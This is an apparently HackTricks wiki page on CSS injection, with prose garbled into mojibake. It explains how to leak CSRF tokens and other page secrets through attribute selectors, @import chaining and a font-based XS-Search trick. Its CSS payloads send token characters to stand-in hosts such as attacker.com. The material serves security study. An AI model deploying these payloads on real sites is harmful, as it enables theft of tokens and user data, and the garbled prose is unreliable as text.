# CSS Injection

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

рджреВрд╕рд░реЗ рддрд░реАрдХреЗ HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## CSS Injection

### рд╡рд┐рд╢реЗрд╖рддрд╛ рдЪрдпрдирдХрд░реНрддрд╛

CSS рдЪрдпрдирдХрд░реНрддрд╛ `input` рддрддреНрд╡ рдХреЗ `name` рдФрд░ `value` рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЗ рдорд╛рдиреЛрдВ рдХреЛ рдорд┐рд▓рд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдП рдЧрдП рд╣реИрдВред рдЕрдЧрд░ рдЗрдирдкреБрдЯ рддрддреНрд╡ рдХреА рдорд╛рди рд╡рд┐рд╢реЗрд╖рддрд╛ рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╡рд░реНрдг рд╕реЗ рд╢реБрд░реВ рд╣реЛрддреА рд╣реИ, рддреЛ рдПрдХ рдкреВрд░реНрд╡рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдмрд╛рд╣реНрдп рд╕рдВрд╕рд╛рдзрди рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИ:
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
#### рдЫрд┐рдкреЗ рд╣реБрдП рддрддреНрд╡реЛрдВ рдХреЗ рд▓рд┐рдП рдмрд╛рдпрдкрд╛рд╕

рдЗрд╕ рд╕реАрдорд╛ рдХреЛ рджреВрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк `~` рд╕рд╛рдорд╛рдиреНрдп рд╕рд╣рднрд╛рдИ рд╕рдВрдпреЛрдЬрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЖрдЧрд╛рдореА рд╕рд╣рднрд╛рдИ рддрддреНрд╡ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдлрд┐рд░ CSS рдирд┐рдпрдо рдЫрд┐рдкреЗ рд╣реБрдП рдЗрдирдкреБрдЯ рддрддреНрд╡ рдХреЗ рдмрд╛рдж рдХреЗ рд╕рднреА рд╕рд╣рднрд╛рдИ рдкрд░ рд▓рд╛рдЧреВ рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдмреИрдХрдЧреНрд░рд╛рдЙрдВрдб рдЫрд╡рд┐ рд▓реЛрдб рд╣реЛрддреА рд╣реИ:
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
рдЗрд╕ рддрдХрдиреАрдХ рдХреЛ рд╢рд╛рддрд┐рд░рддрд╛ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рд╡реНрдпрд╛рд╡рд╣рд╛рд░рд┐рдХ рдЙрджрд╛рд╣рд░рдг рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЖрдк рдЗрд╕реЗ [рдпрд╣рд╛рдБ](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e) рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред

#### CSS Injection рдХреЗ рд▓рд┐рдП рдкреВрд░реНрд╡-рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ

CSS Injection рддрдХрдиреАрдХ рдХреЛ рд╕рдлрд▓ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рд╢рд░реНрддреЗрдВ рдкреВрд░реА рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП:

1. **рдкреЗрдпрд▓реЛрдб рд▓рдВрдмрд╛рдИ**: CSS рдЗрдиреНрдЬреЗрдХреНрд╢рди рд╡реЗрдХреНрдЯрд░ рдХреЛ рддреИрдпрд╛рд░ рдХрд┐рдП рдЧрдП рд╕реЗрд▓реЗрдХреНрдЯрд░ рдХреЛ рд╕рдорд╛рдпреЛрдЬрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рд▓рдВрдмрд╛рдИ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред
2. **CSS рдкреБрдирд░реНрдореВрд▓реНрдпрд╛рдВрдХрди**: рдЖрдкрдХреЛ рдкреГрд╖реНрда рдХреЛ рдлреНрд░реЗрдо рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП, рдЬреЛ рдирдП рдЬрдирд░реЗрдЯреЗрдб рдкреЗрдпрд▓реЛрдб рдХреЗ рд╕рд╛рде CSS рдХрд╛ рдкреБрдирд░реНрдореВрд▓реНрдпрд╛рдВрдХрди рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИред
3. **рдмрд╛рд╣реНрдп рд╕рдВрд╕рд╛рдзрди**: рдпрд╣ рддрдХрдиреАрдХ рдмрд╛рд╣реНрдп рд░реВрдк рд╕реЗ рд╣реЛрд╕реНрдЯ рдХреА рдЧрдИ рдЫрд╡рд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдХрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рддреА рд╣реИред рдпрд╣ рд╕рд╛рдЗрдЯ рдХреА рд╕рд╛рдордЧреНрд░реА рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐ (CSP) рджреНрд╡рд╛рд░рд╛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### рдЕрдВрдзрд╛ рд╡рд┐рд╢реЗрд╖рддрд╛ рдЪрдпрдирдХрд░реНрддрд╛

рдЬреИрд╕рд╛ рдХрд┐ [**рдЗрд╕ рдкреЛрд╕реНрдЯ рдореЗрдВ рд╕реНрдкрд╖реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**](https://portswigger.net/research/blind-css-exfiltration), рд╕реЗрд▓реЗрдХреНрдЯрд░ **`:has`** рдФрд░ **`:not`** рдХреЛ рдорд┐рд▓рд╛рдХрд░ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдВрдзреЗ рддрддреНрд╡реЛрдВ рд╕реЗ рднреА рд╕рд╛рдордЧреНрд░реА рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред рдпрд╣ рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рд╣реИ рдЬрдм рдЖрдкрдХреЛ рдирд╣реАрдВ рдкрддрд╛ рдХрд┐ CSS рдЗрдиреНрдЬреЗрдХреНрд╢рди рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╡реЗрдм рдкреЗрдЬ рдореЗрдВ рдХреНрдпрд╛ рд╣реИред\
рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЖрдк рдЙрди рд╕реЗрд▓реЗрдХреНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╣реА рдкреНрд░рдХрд╛рд░ рдХреЗ рдХрдИ рдмреНрд▓реЙрдХ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓реЗрдВред
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд **@import** рддрдХрдиреАрдХ рдХреЗ рд╕рд╛рде рдорд┐рд▓рд╛рдХрд░, **рдмреНрд▓рд╛рдЗрдВрдб рдкреЗрдЬ рд╕реЗ CSS рдЗрдиреНрдЬреЗрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрд╣реБрдд рд╕рд╛рд░реА рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓рдирд╛ рд╕рдВрднрд╡ рд╣реИ** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**ред**

### @import

рдкрд┐рдЫрд▓реА рддрдХрдиреАрдХ рдореЗрдВ рдХреБрдЫ рджреБрд╖реНрдкреНрд░рднрд╛рд╡ рд╣реИрдВ, рдкреНрд░рд╛рдердорд┐рдХ рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред рдЖрдкрдХреЛ рдпрд╛ рддреЛ **рд╡рд┐рдХреНрдЯрд┐рдо рдХреЛ рдХрдИ рд▓рд┐рдВрдХ рднреЗрдЬрдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП**, рдпрд╛ рдлрд┐рд░ рдЖрдкрдХреЛ **CSS рдЗрдиреНрдЬреЗрдХреНрд╢рди рд╡рд▓рдирд░реЗрдмрд▓ рдкреЗрдЬ рдХреЛ рдЖрдИрдлреНрд░реЗрдо рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП**ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдПрдХ рдФрд░ рдЪрддреБрд░ рддрдХрдиреАрдХ рд╣реИ рдЬреЛ **CSS `@import`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИ рддрдХрдиреАрдХ рдХреА рдЧреБрдгрд╡рддреНрддрд╛ рдХреЛ рдмреЗрд╣рддрд░ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдПред

рдпрд╣ рдкрд╣рд▓реА рдмрд╛рд░ [**Pepe Vila**](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf) рджреНрд╡рд╛рд░рд╛ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рдерд╛ рдФрд░ рдпрд╣ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ:

рджрд╕реНрддрд╛рд╡реЗрдЬ рдХреЛ рдПрдХ рдмрд╛рд░ рдФрд░ рдлрд┐рд░ рд╕реЗ рдФрд░ рдлрд┐рд░ рд╕реЗ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ (рдкрд┐рдЫрд▓реЗ рддрдХрдиреАрдХ рдореЗрдВ), рд╣рдо **рдХреЗрд╡рд▓ рдПрдХ рдмрд╛рд░ рдкреЗрдЬ рдХреЛ рд▓реЛрдб рдХрд░реЗрдВрдЧреЗ рдФрд░ рдХреЗрд╡рд▓ рдПрдХ рдЖрдпрд╛рдд рдХреЗ рд╕рд╛рде рд╣рдорд▓реЗ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕рд░реНрд╡рд░ рдХреЛ рд▓реЛрдб рдХрд░реЗрдВрдЧреЗ** (рдпрд╣ рд╡рд┐рдХреНрдЯрд┐рдо рдХреЛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдкреЗрд▓реЛрдб рд╣реИ):
```css
@import url('//attacker.com:5001/start?');
```
1. рдЖрдХреНрд░рдордХ рд╕реЗ **рдХреБрдЫ CSS рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛** рдФрд░ **рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЗрд╕реЗ рд▓реЛрдб рдХрд░реЗрдЧрд╛**ред
2. рд╣рдорд▓рд╛рд╡рд░ рднреЗрдЬреЗрдЧрд╛ CSS рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдкрд╣рд▓рд╛ рд╣рд┐рд╕реНрд╕рд╛ **рдлрд┐рд░ рд╕реЗ рдЕрдкрдиреЗ рд╕рд░реНрд╡рд░ рдкрд░ `@import`**ред
3. рд╣рдорд▓рд╛рд╡рд░ рдХрд╛ рд╕рд░реНрд╡рд░ рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХрд╛ рдЬрд╡рд╛рдм рдЕрднреА рдирд╣реАрдВ рджреЗрдЧрд╛, рдХреНрдпреЛрдВрдХрд┐ рд╣рдореЗрдВ рдХреБрдЫ рд╡рд░реНрдг рд▓реАрдХ рдХрд░рдирд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЗрд╕ рдЖрдпрд╛рдд рдХрд╛ рдЬрд╡рд╛рдм рджреЗрдирд╛ рд╣реИ рддрд╛рдХрд┐ рдЕрдЧрд▓реЗ рд╡рд░реНрдг рд▓реАрдХ рд╣реЛ рд╕рдХреЗрдВред
4. рдкреЗрд▓реЛрдб рдХрд╛ рджреВрд╕рд░рд╛ рдФрд░ рдмрдбрд╝рд╛ рд╣рд┐рд╕реНрд╕рд╛ рдПрдХ **рд╡рд┐рд╢реЗрд╖рддрд╛ рдЪрдпрдирдХрд░реНрддрд╛ рд▓реАрдХ рдкреЗрд▓реЛрдб** рд╣реЛрдЧрд╛ред
5. рдпрд╣ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╕рд░реНрд╡рд░ рдкрд░ **рдЧреБрдкреНрдд рд╕реВрдЪреА рдХрд╛ рдкрд╣рд▓рд╛ рдФрд░ рдЕрдВрддрд┐рдо рд╡рд░реНрдг** рднреЗрдЬреЗрдЧрд╛ред
6. рдЬрдм рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╕рд░реНрд╡рд░ рдиреЗ **рдЧреБрдкреНрдд рд╕реВрдЪреА рдХрд╛ рдкрд╣рд▓рд╛ рдФрд░ рдЕрдВрддрд┐рдо рд╡рд░реНрдг рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рд╣реИ**, рддреЛ рдпрд╣ **рдЪрд░рдг 2 рдореЗрдВ рдЕрдиреБрд░реЛрдзрд┐рдд рдЖрдпрд╛рдд рдХрд╛ рдЬрд╡рд╛рдм рджреЗрдЧрд╛**ред
7. рдЬрд╡рд╛рдм **рдЪрд░рдг 2, 3 рдФрд░ 4** рдХреЗ рддрд░рд╣ рд╣реЛрдЧрд╛, рд▓реЗрдХрд┐рди рдЗрд╕ рдмрд╛рд░ рдпрд╣ **рдЧреБрдкреНрдд рд╕реВрдЪреА рдХрд╛ рджреВрд╕рд░рд╛ рд╡рд░реНрдг рдЦреЛрдЬрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛ рдФрд░ рдлрд┐рд░ рджреНрд╡рд┐рддреАрдп рдЕрдВрддрд┐рдо**ред

рд╣рдорд▓рд╛рд╡рд░ **рдЧреБрдкреНрдд рд╕реВрдЪреА рдХреЛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд▓реАрдХ рдХрд░рдиреЗ рддрдХ рдЗрд╕ рд▓реВрдк рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдЧрд╛**ред

рдЖрдк рдпрд╣рд╛рдБ [**Pepe Vila's code to exploit this here**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЖрдк рдпрд╣рд╛рдБ рд▓рдЧрднрдЧ [**рд╡рд╣реА рдХреЛрдб рд▓реЗрдХрд┐рди рдЯрд┐рдкреНрдкрдгрд┐рдд рдпрд╣рд╛рдБ**](./#css-injection) рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% hint style="info" %}
рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдкреНрд░рд╛рд░рдВрдн рд╕реЗ 2 рд╡рд░реНрдг рдЦреЛрдЬрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдЧрд╛ (рд╢реБрд░реБрдЖрдд рдФрд░ рдЕрдВрдд рд╕реЗ) рдХреНрдпреЛрдВрдХрд┐ рд╡рд┐рд╢реЗрд╖рддрд╛ рдЪрдпрдирдХрд░реНрддрд╛ рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рдЪреАрдЬреЗрдВ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ:
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЧреБрдкреНрдд рд╕реВрдЪрдирд╛ рддреЗрдЬреА рд╕реЗ рд▓реАрдХ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
{% endhint %}

{% hint style="warning" %}
рдХрднреА-рдХрднреА рд╕реНрдХреНрд░рд┐рдкреНрдЯ **рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдирд╣реАрдВ рдкрддрд╛ рд▓рдЧрд╛рддрд╛ рдХрд┐ рдкреНрд░реАрдлрд┐рдХреНрд╕ + рд╕рдлрд┐рдХреНрд╕ рдЬреЛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдкреВрд░реНрдг рдзреНрд╡рдЬ рд╣реИрдВ** рдФрд░ рдпрд╣ рдЖрдЧреЗ рдмрдврд╝реЗрдЧрд╛ (рдкреНрд░реАрдлрд┐рдХреНрд╕ рдореЗрдВ) рдФрд░ рдкреАрдЫреЗ рдЬрд╛рдПрдЧрд╛ (рд╕рдлрд┐рдХреНрд╕ рдореЗрдВ) рдФрд░ рдХрд┐рд╕реА рд╕рдордп рдпрд╣ рд░реБрдХ рдЬрд╛рдПрдЧрд╛ред\
рдЪрд┐рдВрддрд╛ рди рдХрд░реЗрдВ, рдмрд╕ **рдЖрдЙрдЯрдкреБрдЯ** рдХреА **рдЬрд╛рдВрдЪ рдХрд░реЗрдВ** рдХреНрдпреЛрдВрдХрд┐ **рдЖрдк рд╡рд╣рд╛рдВ рдзреНрд╡рдЬ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ**ред
{% endhint %}

### рдЕрдиреНрдп рд╕реЗрд▓реЗрдХреНрдЯрд░

**CSS рд╕реЗрд▓реЗрдХреНрдЯрд░** рдХреЗ рд╕рд╛рде DOM рднрд╛рдЧреЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* **`.class-to-search:nth-child(2)`**: рдпрд╣ DOM рдореЗрдВ "class-to-search" рдХреЗ рд╕рд╛рде рджреВрд╕рд░реЗ рдЖрдЗрдЯрдо рдХреА рдЦреЛрдЬ рдХрд░реЗрдЧрд╛ред
*   **`:empty`** рд╕реЗрд▓реЗрдХреНрдЯрд░: рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП [**рдЗрд╕ рд╡реНрд░рд┐рдЯрдЕрдк**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)** рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:**

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### рддреНрд░реБрдЯрд┐ рдЖрдзрд╛рд░рд┐рдд XS-Search

**рд╕рдВрджрд░реНрдн:** [CSS based Attack: Abusing unicode-range of @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC by @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

рд╕рдордЧреНрд░ рдЙрджреНрджреЗрд╢реНрдп рд╣реИ **рдирд┐рдпрдВрддреНрд░рд┐рдд рдЕрдВрдд рд╕реЗ рдПрдХ рдХрд╕реНрдЯрдо рдлреЙрдиреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛** рдФрд░ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рдХрд┐ **рдкрд╛рда (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, 'A') рдХреЗрд╡рд▓ рдЗрд╕ рдлреЙрдиреНрдЯ рдХреЗ рд╕рд╛рде рдкреНрд░рджрд░реНрд╢рд┐рдд рд╣реЛрддрд╛ рд╣реИ рдЕрдЧрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕рдВрд╕рд╛рдзрди (`favicon.ico`) рд▓реЛрдб рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛**ред
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **рдХрд╕реНрдЯрдо рдлрд╝реЙрдиреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ**:
- рдПрдХ рдХрд╕реНрдЯрдо рдлрд╝реЙрдиреНрдЯ рдХреЛ `<head>` рдЦрдВрдб рдореЗрдВ `<style>` рдЯреИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `@font-face` рдирд┐рдпрдо рдХрд╛ рдкреНрд░рдпреЛрдЧ рдХрд░рдХреЗ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
- рдлрд╝реЙрдиреНрдЯ рдХрд╛ рдирд╛рдо `poc` рд╣реИ рдФрд░ рдпрд╣ рдПрдХ рдмрд╛рд╣реНрдп рдЕрдВрддрд░реНрджреГрд╖реНрдЯрд┐ рд╕реЗ (`http://attacker.com/?leak`) рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
- `unicode-range` рдЧреБрдгрд╕реВрддреНрд░ рдХреЛ `U+0041` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬреЛ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдпреВрдирд┐рдХреЛрдб рд╡рд░реНрдг 'A' рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред

2. **рдлреЙрд▓рдмреИрдХ рдкрд╛рда рдХреЗ рд╕рд╛рде рдСрдмреНрдЬреЗрдХреНрдЯ рддрддреНрд╡**:
- `<body>` рдЦрдВрдб рдореЗрдВ `id="poc0"` рдХреЗ рд╕рд╛рде рдПрдХ `<object>` рддрддреНрд╡ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ рддрддреНрд╡ `http://192.168.0.1/favicon.ico` рд╕реЗ рд╕рдВрд╕рд╛рдзрди рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИред
- рдЗрд╕ рддрддреНрд╡ рдХреЗ рд▓рд┐рдП `font-family` рдХреЛ `<style>` рдЦрдВрдб рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд `poc` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
- рдпрджрд┐ рд╕рдВрд╕рд╛рдзрди (`favicon.ico`) рд▓реЛрдб рдХрд░рдиреЗ рдореЗрдВ рд╡рд┐рдлрд▓ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ `<object>` рдЯреИрдЧ рдХреЗ рдЕрдВрджрд░ рдлреЙрд▓рдмреИрдХ рд╕рд╛рдордЧреНрд░реА (рдЕрдХреНрд╖рд░ 'A') рдкреНрд░рджрд░реНрд╢рд┐рдд рдХреА рдЬрд╛рдПрдЧреАред
- рдпрджрд┐ рдмрд╛рд╣реНрдп рд╕рдВрд╕рд╛рдзрди рд▓реЛрдб рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рдлреЙрд▓рдмреИрдХ рд╕рд╛рдордЧреНрд░реА ('A') рдХреЛ рдХрд╕реНрдЯрдо рдлрд╝реЙрдиреНрдЯ `poc` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

### рд╕реНрдЯрд╛рдЗрд▓рд┐рдВрдЧ рд╕реНрдХреНрд░реЙрд▓-рдЯреВ-рдЯреЗрдХреНрд╕реНрдЯ рдлреНрд░реИрдЧрдореЗрдВрдЯ

**`:target`** рдкреНрд╕реЗрдбреЛ-рдХреНрд▓рд╛рд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ **URL рдлреНрд░реЗрдЧрдореЗрдВрдЯ** рджреНрд╡рд╛рд░рд╛ рд▓рдХреНрд╖рд┐рдд рдПрдХ рддрддреНрд╡ рдХрд╛ рдЪрдпрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреИрд╕рд╛ рдХрд┐ [CSS Selectors Level 4 specification](https://drafts.csswg.org/selectors-4/#the-target-pseudo) рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ `::target-text` рдХрд┐рд╕реА рднреА рддрддреНрд╡ рдХреЗ рд╕рд╛рде рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддрд╛ рд╣реИ рдЬрдм рддрдХ рдкрд╛рда рдХреЛ рдлреНрд░реЗрдЧрдореЗрдВрдЯ рджреНрд╡рд╛рд░рд╛ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рд▓рдХреНрд╖рд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

